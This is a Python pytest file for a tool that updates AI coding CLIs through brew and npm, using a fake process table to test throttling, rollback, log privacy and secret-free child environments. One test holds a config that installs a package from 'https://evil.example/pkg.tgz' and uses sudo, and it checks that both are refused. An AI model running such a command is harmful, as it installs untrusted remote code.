"""Worker CLI updates use a fake process table and never call the real installers."""

from __future__ import annotations

import json
import os
import stat
import threading
import time
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from src.conductor_cli.ops_cli import main
from src.conductor_cli.ops_cli_update import cli_status, update_clis
from src.conductor_cli.ops_runtime import prepare
from src.conductor_cli.ops_support import Completed, OpsError
from tests.unit.test_cond_ops import SECRET, FakeSystem, _assert_no_port_8000, _layout


class Clock:
    def __init__(self) -> None:
        self.moment = datetime(2026, 11, 8, tzinfo=UTC)

    def __call__(self) -> datetime:
        return self.moment


class HelpFails(FakeSystem):
    def __init__(self, names: set[str]) -> None:
        super().__init__()
        self.names = names

    def run(self, argv, *, cwd=None, env=None, timeout=None):  # noqa: ANN001
        if Path(argv[0]).name in self.names and "--help" in argv:
            self.commands.append(list(argv))
            return Completed(1, "", "smoke failed")
        return super().run(argv, cwd=cwd, env=env, timeout=timeout)


class UpdateFails(FakeSystem):
    def __init__(self, names: set[str], stderr: str) -> None:
        super().__init__()
        self.names = names
        self.stderr = stderr

    def run(self, argv, *, cwd=None, env=None, timeout=None):  # noqa: ANN001
        if Path(argv[0]).name in self.names and "upgrade" in argv:
            self.commands.append(list(argv))
            return Completed(1, "", self.stderr)
        return super().run(argv, cwd=cwd, env=env, timeout=timeout)


class TimeoutNpm(FakeSystem):
    def run(self, argv, *, cwd=None, env=None, timeout=None):  # noqa: ANN001
        if Path(argv[0]).name == "npm":
            self.commands.append(list(argv))
            raise OpsError("timed out running npm")
        return super().run(argv, cwd=cwd, env=env, timeout=timeout)


class VersionedNpm(FakeSystem):
    """Each npm package keeps its own latest/rolled flag. Parallel CLIs must not share one bool."""

    _BINARY = {
        "grok": "@xai-official/grok",
        "mcode": "@minimax-ai/code",
        "dsh": "@deepseek-ai/dsh",
    }

    def __init__(self) -> None:
        super().__init__()
        self._guard = threading.Lock()
        self._latest: set[str] = set()
        self.rolled = False

    def run(self, argv, *, cwd=None, env=None, timeout=None):  # noqa: ANN001
        self.commands.append(list(argv))
        name = Path(argv[0]).name
        with self._guard:
            if name == "npm" and "i" in argv:
                package = argv[-1]
                pkg = package.rsplit("@", 1)[0]
                if package.endswith("@latest"):
                    self._latest.add(pkg)
                    return Completed(0, "", "")
                if package.endswith("@1.0.0"):
                    self._latest.discard(pkg)
                    if pkg == "@xai-official/grok":
                        self.rolled = True
                    return Completed(0, "", "")
                return Completed(1, "", "unexpected npm target")
            pkg = self._BINARY.get(name)
            latest = pkg in self._latest if pkg else False
            if argv[-1:] == ["--version"]:
                return Completed(0, ("2.0.0\n" if latest else "1.0.0\n"), "")
            if argv[-1:] == ["--help"] and name == "grok" and latest:
                return Completed(1, "", "smoke failed")
            if argv[-1:] == ["--help"]:
                return Completed(0, "", "")
        return super().run(argv, cwd=cwd, env=env, timeout=timeout)


class Overlap(FakeSystem):
    def __init__(self) -> None:
        super().__init__()
        self.depth = 0
        self.max_depth = 0
        self.guard = threading.Lock()

    def run(self, argv, *, cwd=None, env=None, timeout=None):  # noqa: ANN001
        if Path(argv[0]).name == "npm" and "i" in argv:
            with self.guard:
                self.depth += 1
                self.max_depth = max(self.max_depth, self.depth)
            time.sleep(0.2)
            with self.guard:
                self.depth -= 1
        return super().run(argv, cwd=cwd, env=env, timeout=timeout)


def _rewrite_daemon(home: Path, provider: str) -> None:
    path = home / ".conductor" / "daemons.toml"
    text = path.read_text(encoding="utf-8")
    path.write_text(text.replace('provider = "codex"', f'provider = "{provider}"'), encoding="utf-8")


def _jsonl(home: Path) -> list[dict]:
    path = home / ".conductor" / "logs" / "cli-update.jsonl"
    return [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]


def _provider_started(fake: FakeSystem, provider: str) -> bool:
    for argv in fake.commands:
        if "--provider" in argv and argv[argv.index("--provider") + 1] == provider:
            return True
    return False


def test_up_updates_then_starts_the_daemon(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    home = _layout(tmp_path, monkeypatch)
    fake = FakeSystem()
    assert main(["up"], system=fake) == 0
    blob = "\n".join(" ".join(argv) for argv in fake.commands)
    assert "brew upgrade --cask codex" in blob
    assert "server.py --host 127.0.0.1" in blob.split("brew upgrade --cask codex")[0]
    assert _provider_started(fake, "codex")
    rows = _jsonl(home)
    assert any(row["name"] == "codex" and row["result"] == "updated" for row in rows)
    assert all(row["name"] != "zcode" or row["result"] == "app-managed" for row in rows)
    mode = stat.S_IMODE((home / ".conductor" / "logs" / "cli-update.jsonl").stat().st_mode)
    assert mode == 0o600
    assert SECRET not in (home / ".conductor" / "logs" / "cli-update.jsonl").read_text(encoding="utf-8")
    _assert_no_port_8000(fake)


def test_update_failure_timeout_and_network_still_start_the_daemon(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = _layout(tmp_path, monkeypatch)
    network = UpdateFails({"brew"}, "network unreachable")
    assert main(["up"], system=network) == 0
    assert _provider_started(network, "codex")
    assert any(row["result"] == "failed" and row["detail"] == "network" for row in _jsonl(home))

    home = _layout(tmp_path / "timeout", monkeypatch)
    _rewrite_daemon(home, "grok")
    timed = TimeoutNpm()
    assert main(["up"], system=timed) == 0
    assert _provider_started(timed, "grok")
    assert any(row["name"] == "grok" and "timed out" in row["detail"] for row in _jsonl(home))


class InstallerThenSmokeFails(FakeSystem):
    """The installer has started. Version and help then fail or cannot run."""

    def __init__(self, *, timeout: bool) -> None:
        super().__init__()
        self.timeout = timeout
        self.started = False

    def run(self, argv, *, cwd=None, env=None, timeout=None):  # noqa: ANN001
        name = Path(argv[0]).name
        if name == "brew" and "upgrade" in argv:
            self.commands.append(list(argv))
            self.started = True
            if self.timeout:
                raise OpsError("timed out running brew")
            return Completed(1, "", "installer exited 1")
        if self.started and argv[-1:] == ["--version"]:
            self.commands.append(list(argv))
            if self.timeout:
                raise OpsError("timed out running claude")
            return Completed(1, "", "missing")
        if self.started and argv[-1:] == ["--help"]:
            self.commands.append(list(argv))
            return Completed(1, "", "missing")
        return super().run(argv, cwd=cwd, env=env, timeout=timeout)


def test_installer_nonzero_and_timeout_with_failed_smoke_are_broken(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = _layout(tmp_path, monkeypatch)
    _rewrite_daemon(home, "claude")
    failed = InstallerThenSmokeFails(timeout=False)
    assert main(["up"], system=failed) == 1
    assert not _provider_started(failed, "claude")
    row = next(item for item in _jsonl(home) if item["name"] == "claude")
    assert row["result"] == "broken"
    assert "smoke failed" in row["detail"]

    home = _layout(tmp_path / "timeout", monkeypatch)
    _rewrite_daemon(home, "claude")
    timed = InstallerThenSmokeFails(timeout=True)
    assert main(["up"], system=timed) == 1
    assert not _provider_started(timed, "claude")
    row = next(item for item in _jsonl(home) if item["name"] == "claude")
    assert row["result"] == "broken"
    assert "timed out" in row["detail"]
    assert "smoke failed" in row["detail"]


def test_brew_smoke_failure_marks_the_cli_broken_and_holds_its_daemon(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    home = _layout(tmp_path, monkeypatch)
    _rewrite_daemon(home, "claude")
    fake = HelpFails({"claude"})
    assert main(["up"], system=fake) == 1
    assert not _provider_started(fake, "claude")
    assert any(row["name"] == "claude" and row["result"] == "broken" for row in _jsonl(home))
    capsys.readouterr()
    assert main(["doctor", "--json"], system=fake) == 1
    report = json.loads(capsys.readouterr().out)
    assert any(item.get("name") == "cli" and item.get("cli") == "claude" and item.get("ok") is False for item in report["checks"])
    status = main(["status"], system=fake)
    assert status == 1
    assert "cli: claude broken" in capsys.readouterr().out


def test_npm_smoke_failure_rolls_back_and_cursor_symlink_is_restored(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = _layout(tmp_path, monkeypatch)
    _rewrite_daemon(home, "grok")
    fake = VersionedNpm()
    assert main(["cli", "update", "--only", "grok", "--force"], system=fake) == 0
    assert fake.rolled
    assert any(row["name"] == "grok" and row["result"] == "rolled-back" for row in _jsonl(home))
    assert main(["up"], system=fake) == 0
    assert _provider_started(fake, "grok")

    versions = home / ".local" / "share" / "cursor-agent" / "versions"
    old = versions / "old"
    new = versions / "new"
    old.mkdir(parents=True)
    new.mkdir()
    current = versions / "current"
    current.symlink_to(old)

    class CursorSmoke(FakeSystem):
        def run(self, argv, *, cwd=None, env=None, timeout=None):  # noqa: ANN001
            self.commands.append(list(argv))
            if Path(argv[0]).name == "cursor-agent" and argv[-1:] == ["update"]:
                current.unlink()
                current.symlink_to(new)
                return Completed(0, "", "")
            if argv[-1:] == ["--help"]:
                # The new install fails smoke. The restored symlink has to pass it.
                if Path(os.path.realpath(current)) == new.resolve():
                    return Completed(1, "", "smoke failed")
                return Completed(0, "", "")
            if argv[-1:] == ["--version"]:
                return Completed(0, "9\n", "")
            return Completed(0, "", "")

    cursor = CursorSmoke()
    assert main(["cli", "update", "--only", "cursor-agent", "--force"], system=cursor) == 0
    assert Path(os.path.realpath(current)) == old.resolve()
    assert any(row["result"] == "rolled-back" and row["name"] == "cursor-agent" for row in _jsonl(home))


def test_throttle_force_pin_skip_and_dry_run(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]) -> None:
    home = _layout(tmp_path, monkeypatch)
    fake = FakeSystem()
    clock = Clock()
    _system, settings, _fleet = prepare(fake)
    first = update_clis(fake, settings, only="codex", clock=clock)
    assert first[0]["result"] == "updated"
    clock.moment += timedelta(hours=1)
    second = update_clis(fake, settings, only="codex", clock=clock)
    assert second[0]["result"] == "skipped"
    assert second[0]["detail"] == "throttle"
    forced = update_clis(fake, settings, only="codex", force=True, clock=clock)
    assert forced[0]["result"] == "updated"
    brew_before = sum(1 for argv in fake.commands if argv[:2] == ["brew", "upgrade"])

    (home / ".conductor" / "clis.toml").write_text(
        '[codex]\npin = "1.2.3"\n\n[kimi]\nskip = true\n',
        encoding="utf-8",
    )
    pinned = update_clis(fake, settings, only="codex", force=True, clock=clock)
    assert pinned[0]["result"] == "skipped"
    assert pinned[0]["detail"] == "pin"
    skipped = update_clis(fake, settings, only="kimi", force=True, clock=clock)
    assert skipped[0]["detail"] == "skip"
    assert sum(1 for argv in fake.commands if argv[:2] == ["brew", "upgrade"]) == brew_before

    dry = FakeSystem()
    assert main(["cli", "update", "--only", "opencode", "--dry-run", "--json"], system=dry) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload[0]["result"] == "dry-run"
    assert not any(argv[:2] == ["brew", "upgrade"] for argv in dry.commands)
    assert not any("--version" in argv or "--help" in argv for argv in dry.commands)


def test_custom_update_commands_are_refused(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    home = _layout(tmp_path, monkeypatch)
    (home / ".conductor" / "clis.toml").write_text(
        '\n'.join(
            [
                "[claude]",
                'update = ["sudo", "brew", "upgrade", "--cask", "claude-code"]',
                "",
                "[grok]",
                'update = ["npm", "i", "-g", "https://evil.example/pkg.tgz"]',
                "",
            ]
        ),
        encoding="utf-8",
    )
    fake = FakeSystem()
    assert main(["cli", "update", "--only", "claude", "--force"], system=fake) == 1
    assert main(["cli", "update", "--only", "grok", "--force"], system=fake) == 1
    blob = "\n".join(" ".join(argv) for argv in fake.commands)
    assert "sudo" not in blob
    assert "https://evil.example/pkg.tgz" not in blob
    assert "://" not in blob


def test_status_reports_path_and_install_without_updating(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    _layout(tmp_path, monkeypatch)
    fake = FakeSystem()
    assert main(["cli", "status", "--json"], system=fake) == 0
    rows = json.loads(capsys.readouterr().out)
    by_name = {row["name"]: row for row in rows}
    assert by_name["codex"]["install"] == "brew-cask"
    assert by_name["zcode"]["install"] == "app"
    assert by_name["step"]["path"] == "step"
    assert not any(argv[:2] == ["brew", "upgrade"] for argv in fake.commands)
    described = cli_status(*prepare(fake)[:2])
    assert {row["name"] for row in described} == {row["name"] for row in rows}


def test_throttle_survives_the_skip_it_writes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    home = _layout(tmp_path, monkeypatch)
    fake = FakeSystem()
    clock = Clock()
    _system, settings, _fleet = prepare(fake)
    first = update_clis(fake, settings, only="codex", clock=clock)
    assert first[0]["result"] == "updated"
    clock.moment += timedelta(hours=1)
    second = update_clis(fake, settings, only="codex", clock=clock)
    assert second[0]["result"] == "skipped"
    assert second[0]["detail"] == "throttle"
    clock.moment += timedelta(minutes=1)
    third = update_clis(fake, settings, only="codex", clock=clock)
    assert third[0]["result"] == "skipped"
    upgrades = [argv for argv in fake.commands if argv[:3] == ["brew", "upgrade", "--cask"]]
    assert upgrades.count(["brew", "upgrade", "--cask", "codex"]) == 1
    assert any(row["name"] == "codex" and row["result"] == "updated" for row in _jsonl(home))


class SmokeTimeout(FakeSystem):
    """Version times out only after the installer has returned 0."""

    def __init__(self) -> None:
        super().__init__()
        self.updated = False

    def run(self, argv, *, cwd=None, env=None, timeout=None):  # noqa: ANN001
        if argv == ["brew", "upgrade", "--cask", "claude-code"]:
            self.commands.append(list(argv))
            self.updated = True
            return Completed(0, "", "")
        if argv == ["claude", "--version"] and self.updated:
            self.commands.append(list(argv))
            raise OpsError("timed out running claude")
        return super().run(argv, cwd=cwd, env=env, timeout=timeout)


def test_smoke_timeout_after_install_keeps_the_daemon_down(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = _layout(tmp_path, monkeypatch)
    _rewrite_daemon(home, "claude")
    fake = SmokeTimeout()
    assert main(["up"], system=fake) == 1
    assert not _provider_started(fake, "claude")
    row = next(item for item in _jsonl(home) if item["name"] == "claude")
    assert row["result"] == "broken"
    assert "timed out" in row["detail"]
    from src.conductor_cli.ops_cli_update import persisted_health

    _system, settings, _fleet = prepare(fake)
    assert persisted_health(settings)["claude"] == "broken"


class BuildMetadata(FakeSystem):
    def __init__(self, version: str) -> None:
        super().__init__()
        self.version = version
        self.updated = False

    def run(self, argv, *, cwd=None, env=None, timeout=None):  # noqa: ANN001
        self.commands.append(list(argv))
        if Path(argv[0]).name == "npm" and "i" in argv:
            self.updated = argv[-1].endswith("@latest")
            return Completed(0, "", "")
        if argv[-1:] == ["--version"]:
            return Completed(0, self.version + "\n", "")
        if argv[-1:] == ["--help"]:
            return Completed(1 if self.updated else 0, "", "smoke failed")
        return super().run(argv, cwd=cwd, env=env, timeout=timeout)


def test_npm_rollback_keeps_build_metadata(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    home = _layout(tmp_path, monkeypatch)
    plus = BuildMetadata("1.2.3+build.7")
    assert main(["cli", "update", "--only", "grok", "--force"], system=plus) == 0
    assert ["npm", "i", "-g", "@xai-official/grok@1.2.3+build.7"] in plus.commands
    assert any(row["result"] == "rolled-back" for row in _jsonl(home))

    home = _layout(tmp_path / "paren", monkeypatch)
    paren = BuildMetadata("mcode 1.2.3 (build)")
    assert main(["cli", "update", "--only", "mcode", "--force"], system=paren) == 0
    assert ["npm", "i", "-g", "@minimax-ai/code@1.2.3"] in paren.commands


def test_bad_config_does_not_abort_daemon_start(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = _layout(tmp_path, monkeypatch)
    (home / ".conductor" / "clis.toml").write_text("this is not [ toml\n", encoding="utf-8")
    fake = FakeSystem()
    assert main(["up"], system=fake) == 0
    assert _provider_started(fake, "codex")

    home = _layout(tmp_path / "interval", monkeypatch)
    monkeypatch.setenv("CONDUCTOR_CLI_UPDATE_INTERVAL_HOURS", "nope")
    fake = FakeSystem()
    assert main(["up"], system=fake) == 0
    assert _provider_started(fake, "codex")


def test_update_log_is_private_and_does_not_follow_a_symlink(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = _layout(tmp_path, monkeypatch)
    log_dir = home / ".conductor" / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    target = tmp_path / "elsewhere.jsonl"
    target.write_text("ORIGINAL\n", encoding="utf-8")
    link = log_dir / "cli-update.jsonl"
    link.symlink_to(target)
    old = os.umask(0o022)
    try:
        fake = FakeSystem()
        assert main(["cli", "update", "--only", "codex", "--force"], system=fake) == 0
    finally:
        os.umask(old)
    assert target.read_text(encoding="utf-8") == "ORIGINAL\n"
    assert not link.is_symlink()
    assert stat.S_IMODE(link.stat().st_mode) == 0o600
    assert any(row["name"] == "codex" for row in _jsonl(home))


def test_update_children_do_not_inherit_secret_env(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _layout(tmp_path, monkeypatch)
    monkeypatch.setenv("REDTEAM_CANARY", "rt-canary-not-a-key")
    monkeypatch.setenv("PATH", "/usr/bin:/bin")
    seen: list[dict | None] = []

    class Recording(FakeSystem):
        def run(self, argv, *, cwd=None, env=None, timeout=None):  # noqa: ANN001
            seen.append(dict(env) if env else None)
            return super().run(argv, cwd=cwd, env=env, timeout=timeout)

    assert main(["cli", "update", "--only", "codex", "--force"], system=Recording()) == 0
    assert seen
    assert all(env is not None and "REDTEAM_CANARY" not in env and env.get("PATH") for env in seen)


def test_broken_cli_holds_the_daemon_provider_alias(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = _layout(tmp_path, monkeypatch)
    _rewrite_daemon(home, "claude-code")
    fake = HelpFails({"claude"})
    assert main(["up"], system=fake) == 1
    assert not _provider_started(fake, "claude-code")


def test_non_brew_updates_overlap(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _layout(tmp_path, monkeypatch)
    fake = Overlap()
    _system, settings, _fleet = prepare(fake)
    rows = update_clis(fake, settings, clock=Clock())
    assert any(row["name"] == "grok" and row["result"] == "updated" for row in rows)
    assert fake.max_depth >= 2
